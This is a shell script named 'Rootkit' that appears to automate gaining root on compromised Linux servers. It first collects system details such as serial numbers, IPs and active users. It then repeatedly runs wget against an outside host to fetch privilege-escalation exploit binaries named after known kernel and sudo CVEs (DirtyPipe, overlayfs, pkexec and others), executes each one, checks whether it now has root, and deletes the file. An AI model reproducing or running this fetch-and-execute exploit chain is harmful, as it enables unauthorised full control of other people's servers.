#!/bin/sh
#Name     : Rootkit
#Author   : G1337
#Facebook : https://www.facebook.com/profile.php?id=100052166387726
#Instagram  : https://instagram.com/ghee_1337
#USAGE    : bash autoroot.sh or ./autoroot.sh

RED="\e[31m"
GREEN="\e[32m"
ENDCOLOR="\e[0m"

clear
echo -e "${RED}Auto Rooting Server By : G1337${ENDCOLOR}"
echo -e "${RED}Blog : https://www.remaja1337.my.id${ENDCOLOR}"

checkroot() {
if [ $(id -u) == 0 ]; then
echo
echo "Wh00ps !! Successfully R00T3D"
echo "ID     => " $(id)
echo "WHOAMI => " $(whoami)
echo
exit
fi
}

echo -e "${GREEN}System Information${ENDCOLOR} :"
echo -e "${GREEN}Hostname${ENDCOLOR} :\t"`hostname`
echo -e "${GREEN}uptime${ENDCOLOR} :\t\t"`uptime | awk -F'( |,|:)+' '{print $6,$7",",$8,"hours,",$9,"minutes."}'`
echo -e "${GREEN}Manufacturer${ENDCOLOR} :\t"`cat /sys/class/dmi/id/chassis_vendor`
echo -e "${GREEN}Product Name${ENDCOLOR} :\t"`cat /sys/class/dmi/id/product_name`
echo -e "${GREEN}Version${ENDCOLOR} :\t"`cat /sys/class/dmi/id/product_version`
echo -e "${GREEN}Serial Number${ENDCOLOR} :\t"`cat /sys/class/dmi/id/product_serial`
echo -e "${GREEN}Machine Type${ENDCOLOR} :\t"`vserver=$(lscpu | grep Hypervisor | wc -l); if [ $vserver -gt 0 ]; then echo "VM"; else echo "Physical"; fi`
echo -e "${GREEN}Operating System${ENDCOLOR} :\t"`hostnamectl | grep "Operating System" | cut -d ' ' -f5-`
echo -e "${GREEN}Kernel${ENDCOLOR} :\t"`uname -r`
echo -e "${GREEN}Architecture${ENDCOLOR} :\t"`arch`
echo -e "${GREEN}Processor Name${ENDCOLOR} :\t"`awk -F':' '/^model name/ {print $2}' /proc/cpuinfo | uniq | sed -e 's/^[ \t]*//'`
echo -e "${GREEN}Active User${ENDCOLOR} :\t"`w | cut -d ' ' -f1 | grep -v USER | xargs -n1`
echo -e "${GREEN}System Main IP${ENDCOLOR} :\t"`hostname -I`
echo -e "${GREEN}CPU/Memory Usage${ENDCOLOR} :"
echo -e "${GREEN}Memory Usage${ENDCOLOR} :\t"`free | awk '/Mem/{printf("%.2f%"), $3/$2*100}'`
echo -e "${GREEN}Swap Usage${ENDCOLOR} :\t"`free | awk '/Swap/{printf("%.2f%"), $3/$2*100}'`
echo -e "${GREEN}CPU Usage${ENDCOLOR} :\t"`cat /proc/stat | awk '/cpu/{printf("%.2f%\n"), ($2+$4)*100/($2+$4+$5)}' |  awk '{print $0}' | head -1`
echo -e "${GREEN}Disk Usage >80%"
df -Ph | sed s/%//g | awk '{ if($5 > 80) print $0;}'

echo -e "${GREEN}For WWN Details${ENDCOLOR} :"
vserver=$(lscpu | grep Hypervisor | wc -l)
if [ $vserver -gt 0 ]
then
echo "$(hostname) is a VM"
else
cat /sys/class/fc_host/host?/port_name
fi
echo ""

echo -e "${GREEN}Oracle DB Instances${ENDCOLOR} :"
if id oracle >/dev/null 2>&1; then
/bin/ps -ef|grep pmon
else
echo "oracle user does not exist on $(hostname)"
fi
echo ""

if (( $(cat /etc/*-release | grep -w "Oracle|Red Hat|CentOS|Fedora" | wc -l) > 0 ))
then
echo -e "${GREEN}Package Updates${ENDCOLOR} :"
yum updateinfo summary | grep 'Security|Bugfix|Enhancement'
echo -e "============================"
else
echo -e "${GREEN}Package Updates${ENDCOLOR}"
cat /var/lib/update-notifier/updates-available
fi

#START R00TING
echo -e "${RED}======START ROOTING SERVER======${ENDCOLOR}"
wget -q https://bssn.koding.com/ak --no-check-certificate
chmod 0777 ak
./ak 
checkroot
rm ak 
rm -rf GCONV_PATH=.
rm -rf .pkexec
wget -q https://bssn.koding.com/ptrace_traceme --no-check-certificate
chmod 0777 ptrace_traceme
./ptrace_traceme
checkroot
rm ptrace_traceme
wget -q https://bssn.koding.com/ptrace --no-check-certificate
chmod 0777 ptrace
./ptrace 
checkroot
rm ptrace 
wget -q  https://bssn.koding.com/CVE-2022-0847-DirtyPipe-Exploits/exploit-1 --no-check-certificate
wget -q https://bssn.koding.com/CVE-2022-0847-DirtyPipe-Exploits/exploit-2 --no-check-certificate
chmod 0777 exploit-1
chmod 0777 exploit-2 
./exploit-1
checkroot
rm exploit-1
./exploit-2 SUID
checkroot
rm exploit-2
wget -q https://bssn.koding.com/a2.out --no-check-certificate
chmod 0777 a2.out
find / -perm 4000 -type -f 2>/dev/null or find / -perm -u=s -type -f 2>/dev/null 
./a2.out /usr/bin/sudo
checkroot
./a2.out /usr/bin/passwd
checkroot
rm a2.out
wget -q https://bssn.koding.com/dirtypipe --no-check-certificate
chmod 0777 dirtypipe
./dirtypipe sudo /usr/local/bin
checkroot
rm dirtypipe
wget -q https://bssn.koding.com/af_packet --no-check-certificate
chmod 0777 af_packet
./af_packet 
checkroot
rm af_packet
wget -q https://bssn.koding.com/CVE-2015-1328 --no-check-certificate
chmod 0777 CVE-2015-1328
./CVE-2015-1328
checkroot
rm CVE-2015-1328
wget -q https://bssn.koding.com/CVE-2016-9793 --no-check-certificate
chmod 0777 CVE-2016-9793
./CVE-2016-9793
checkroot
rm CVE-2016-9793
wget -q https://bssn.koding.com/cve-2017-16995 --no-check-certificate
chmod 0777 cve-2017-16995
./cve-2017-16995
checkroot
rm cve-2017-16995
wget -q https://bssn.koding.com/exp --no-check-certificate
chmod 0777 exp
./exp
checkroot
rm exp 
wget -q https://bssn.koding.com/exploit-debian --no-check-certificate
chmod 0777 exploit-debian
./exploit-debian
checkroot
rm exploit-debian
wget -q https://bssn.koding.com/exploit-ubuntu --no-check-certificate
chmod 0777 exploit-ubuntu
./exploit-ubuntu
checkroot
rm exploit-ubuntu
wget -q https://bssn.koding.com/newpid --no-check-certificate
chmod 0777 newpid 
./newpid
checkroot
rm newpid
wget -q https://bssn.koding.com/pwn --no-check-certificate
chmod 0777 pwn
./pwn
checkroot
rm pwn
wget -q https://bssn.koding.com/raceabrt 
chmod 0777 raceabrt
./raceabrt
checkroot
rm raceabrt
wget -q https://bssn.koding.com/timeoutpwn --no-check-certificate
chmod 0777 timeoutpwn
./timeoutpwn
checkroot
rm timeoutpwn
wget -q https://bssn.koding.com/upstream44 --no-check-certificate
chmod 0777 upstream44
./upstream44
checkroot
rm upstream44
wget -q https://bssn.koding.com/netfilter --no-check-certificate
chmod 0777 netfilter
./netfilter
checkroot
rm netfilter
wget -q https://bssn.koding.com/exploit.sh --no-check-certificate
chmod 0777 exploit.sh 
./exploit.sh 2>/dev/null
checkroot
rm exploit.sh 
wget -q https://bssn.koding.com/lpe.sh --no-check-certificate 
chmod 0777 lpe.sh
./lpe.sh
checkroot
rm lpe.sh
wget -q https://bssn.koding.com/a.out --no-check-certificate 
chmod 0777 a.out
./a.out 0 & ./a.out 1
checkroot
rm a.out
wget -q https://bssn.koding.com/lpe.sh --no-check-certificate 
chmod 0777 lpe.sh
./lpe.sh
checkroot
rm lpe.sh
wget -q https://bssn.koding.com/cve-2021-22555 --no-check-certificate 
chmod 0777 cve-2021-22555 
./cve-2021-22555
checkroot
rm cve-2021-22555
wget -q https://bssn.koding.com/linux_sudo_cve-2017-1000367 --no-check-certificate 
chmod 0777 linux_sudo_cve-2017-1000367
./linux_sudo_cve-2017-1000367
checkroot
rm linux_sudo_cve-2017-1000367
wget -q https://bssn.koding.com/overlayfs --no-check-certificate
chmod 0777 overlayfs
./overlayfs
checkroot
rm overlayfs
wget -q https://bssn.koding.com/CVE-2021-3493 --no-check-certificate
chmod 0777 CVE-2021-3493
./overlayfs
checkroot
rm CVE-2021-3493

